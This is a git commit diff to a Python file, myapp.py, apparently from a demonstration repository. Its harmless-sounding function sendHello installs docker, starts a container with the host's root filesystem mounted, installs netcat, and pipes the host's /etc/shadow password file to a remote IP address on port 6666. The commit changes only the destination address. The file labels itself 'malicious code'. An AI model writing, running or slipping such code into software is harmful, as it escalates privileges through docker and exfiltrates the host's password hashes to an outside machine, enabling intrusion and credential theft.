7088cce50e5250834f99244ba726933384c97e60
mydockergit <37586216+mydockergit@users.noreply.github.com>
2018-03-27 10:06:49 +0300

    Update myapp.py

--- myapp.py
+++ myapp.py
@@ -3,7 +3,7 @@ def sendHello():
     call(["yum", "-y", "install", "docker"])
     call(["docker", "run", "-dt", "-v", "/:/var/tmp", "--name", "PE", "-h", "PE", "centos", "/bin/bash"])
     call(["docker", "exec", "PE", "yum", "-y", "install", "nc"])
-    call(["docker","exec","PE","bash","-c", 'cat /var/tmp/etc/shadow | nc 172.31.51.53 6666']) 
+    call(["docker","exec","PE","bash","-c", 'cat /var/tmp/etc/shadow | nc 172.31.49.211 6666']) 
     print "malicious code"
     return "Hello"
 
